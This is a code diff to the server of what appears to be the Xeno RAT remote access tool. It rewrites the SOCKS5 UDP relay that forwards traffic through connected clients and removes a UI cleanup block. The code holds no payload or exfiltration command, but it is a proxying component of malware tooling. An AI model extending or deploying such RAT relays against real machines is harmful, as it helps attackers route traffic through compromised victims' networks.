@@ -165,7 +165,7 @@ namespace xeno_rat_server.Forms
                     lvi = new ListViewItem($"UDP Relay {localEp.Address}:{localEp.Port}");
                     listView1?.BeginInvoke((MethodInvoker)(() => listView1.Items.Add(lvi)));
 
-                    _ = Task.Run(() => HandleUdpRelay(udpRelay, clientSock, lvi));
+                    _ = Task.Run(() => HandleUdpRelay(udpRelay, clientSock));
                     return;
                 }
                 else if (cmd == 1)
@@ -205,8 +205,10 @@ namespace xeno_rat_server.Forms
             }
         }
 
-        private async Task HandleUdpRelay(UdpClient udpRelay, Socket clientSock, ListViewItem lvi)
+        private async Task HandleUdpRelay(UdpClient udpRelay, Socket clientSock)
         {
+            IPEndPoint clientEp = null;
+
             try
             {
                 Console.WriteLine("UDP relay started...");
@@ -215,79 +217,85 @@ namespace xeno_rat_server.Forms
                 {
                     var result = await udpRelay.ReceiveAsync();
                     byte[] data = result.Buffer;
-                    IPEndPoint sourceEp = result.RemoteEndPoint;
 
-                    if (data.Length < 10) // Minimum SOCKS5 UDP header size
-                        continue;
+                    // First packet tells us the client's source endpoint
+                    if (clientEp == null) clientEp = result.RemoteEndPoint;
+
+                    if (data.Length < 10) continue; // minimum SOCKS5 UDP header size
 
                     int offset = 0;
-
-                    // SOCKS5 UDP Header: RSV (2) + FRAG (1)
                     offset += 2; // RSV
-                    offset += 1; // FRAG
-
+                    byte frag = data[offset++]; // FRAG
                     byte atyp = data[offset++];
+
                     string destAddr = "";
                     int destPort = 0;
 
-                    // --- Parse ATYP and destination address ---
-                    switch (atyp)
+                    // --- Parse destination address ---
+                    if (atyp == 0x01) // IPv4
                     {
-                        case 0x01: // IPv4
-                            destAddr = new IPAddress(data.Skip(offset).Take(4).ToArray()).ToString();
-                            offset += 4;
-                            break;
-
-                        case 0x03: // Domain name
-                            int len = data[offset++];
-                            destAddr = Encoding.ASCII.GetString(data, offset, len);
-                            offset += len;
-                            break;
-
-                        case 0x04: // IPv6
-                            destAddr = new IPAddress(data.Skip(offset).Take(16).ToArray()).ToString();
-                            offset += 16;
-                            break;
-
-                        default:
-                            Console.WriteLine($"Unsupported ATYP: {atyp}");
-                            continue;
+                        destAddr = new IPAddress(new byte[] { data[offset], data[offset + 1], data[offset + 2], data[offset + 3] }).ToString();
+                        offset += 4;
+                    }
+                    else if (atyp == 0x03) // Domain
+                    {
+                        int len = data[offset++];
+                        destAddr = Encoding.ASCII.GetString(data, offset, len);
+                        offset += len;
+                    }
+                    else if (atyp == 0x04) // IPv6
+                    {
+                        byte[] ipv6 = new byte[16];
+                        Array.Copy(data, offset, ipv6, 0, 16);
+                        destAddr = new IPAddress(ipv6).ToString();
+                        offset += 16;
+                    }
+                    else
+                    {
+                        Console.WriteLine("Unsupported ATYP: " + atyp);
+                        continue;
                     }
 
-                    // --- Parse destination port ---
                     destPort = (data[offset] << 8) | data[offset + 1];
                     offset += 2;
 
-                    // --- Extract UDP payload ---
-                    byte[] payload = data.Skip(offset).ToArray();
+                    byte[] payload = new byte[data.Length - offset];
+                    Array.Copy(data, offset, payload, 0, payload.Length);
 
-                    Console.WriteLine($"Parsed SOCKS5 UDP: {destAddr}:{destPort} | {payload.Length} bytes");
-
-                    // --- Send payload to the destination ---
+                    // --- Send to destination ---
                     using (UdpClient remoteUdp = new UdpClient())
                     {
                         await remoteUdp.SendAsync(payload, payload.Length, destAddr, destPort);
 
                         // Wait for response
-                        var response = await remoteUdp.ReceiveAsync();
+                        var resp = await remoteUdp.ReceiveAsync();
 
-                        // Build SOCKS5 UDP response header + payload
-                        byte[] framed = BuildUdpResponse(response.Buffer, response.RemoteEndPoint);
+                        // --- Build SOCKS5 UDP header + payload ---
+                        byte[] addrBytes = resp.RemoteEndPoint.Address.GetAddressBytes();
+                        byte[] portBytes = new byte[] { (byte)(resp.RemoteEndPoint.Port >> 8), (byte)(resp.RemoteEndPoint.Port & 0xFF) };
+                        byte respAtyp = addrBytes.Length == 4 ? (byte)0x01 : (byte)0x04;
 
-                        // Send back through proxy relay
-                        await udpRelay.SendAsync(framed, framed.Length, sourceEp);
-                        Console.WriteLine($"Relayed {response.Buffer.Length} bytes from {response.RemoteEndPoint} back to client");
+                        byte[] respPacket = new byte[3 + 1 + addrBytes.Length + 2 + resp.Buffer.Length];
+                        int roffset = 0;
+                        respPacket[roffset++] = 0x00; // RSV
+                        respPacket[roffset++] = 0x00; // RSV
+                        respPacket[roffset++] = 0x00; // FRAG
+                        respPacket[roffset++] = respAtyp;
+                        Array.Copy(addrBytes, 0, respPacket, roffset, addrBytes.Length);
+                        roffset += addrBytes.Length;
+                        respPacket[roffset++] = portBytes[0];
+                        respPacket[roffset++] = portBytes[1];
+                        Array.Copy(resp.Buffer, 0, respPacket, roffset, resp.Buffer.Length);
+
+                        // --- Send back to client ---
+                        await udpRelay.SendAsync(respPacket, respPacket.Length, clientEp);
                     }
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine("UDP Relay Exception: " + ex.Message);
+                Console.WriteLine("UDP relay error: " + ex.Message);
                 udpRelay.Close();
-            }
-            finally
-            {
-                listView1?.BeginInvoke((MethodInvoker)(() => lvi.Remove()));
             }
         }
 
